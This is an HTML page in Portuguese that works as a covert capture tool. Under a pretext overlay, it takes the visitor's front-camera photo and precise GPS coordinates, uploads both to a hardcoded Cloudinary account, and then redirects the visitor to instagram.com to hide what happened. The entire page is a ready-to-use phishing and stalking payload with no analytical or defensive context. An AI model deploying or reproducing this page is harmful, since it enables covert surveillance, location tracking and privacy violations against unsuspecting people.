<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Captura de Localização e Foto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #FFF; }
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #2E2E2E;
      font-family: sans-serif;
      font-size: 20px;
      background: rgba(255, 255, 255, 0.9);
      z-index: 9999;
      text-align: center;
      padding: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div id="overlay">Toque para autorizar câmera e localização</div>
  <script>
    const cloudName = "dx5legahb";
    const uploadPreset = "upload";
    const folderName = "capturas";

    const overlay = document.getElementById('overlay');

    overlay.onclick = async () => {
      overlay.style.display = 'none';

      // 1. Solicita permissão de câmera
      let stream;
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      } catch (camErr) {
        console.error('Câmera negada:', camErr);
        alert('Permissão de câmera negada. Libere nas configurações do site e recarregue.');
        return;
      }

      // 2. Solicita permissão de localização
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude } = pos.coords;

          // 3. Captura a foto
          const video = document.createElement('video');
          video.setAttribute('autoplay', true);
          video.setAttribute('muted', true);
          video.setAttribute('playsinline', true);
          video.srcObject = stream;
          await new Promise(res => video.onloadedmetadata = res);
          video.play();

          setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(t => t.stop());

            canvas.toBlob(async (blob) => {
              // Upload imagem
              const imgForm = new FormData();
              imgForm.append('file', blob);
              imgForm.append('upload_preset', uploadPreset);
              imgForm.append('folder', folderName);
              const imgResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgForm });
              const imgData = await imgResp.json();

              // Upload localização
              const txtBlob = new Blob([
                `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imgData.secure_url}`
              ], { type: 'text/plain' });
              const txtForm = new FormData();
              txtForm.append('file', txtBlob, `localizacao_${Date.now()}.txt`);
              txtForm.append('upload_preset', uploadPreset);
              txtForm.append('folder', folderName);
              await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: txtForm });

              // Redireciona
              window.location.href = 'https://instagram.com';
            }, 'image/png');
          }, 500);
        },
        (geoErr) => {
          console.error('Localização negada:', geoErr);
          alert('Permissão de localização negada. Libere nas configurações do site e recarregue.');
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    };
  </script>
</body>
</html>
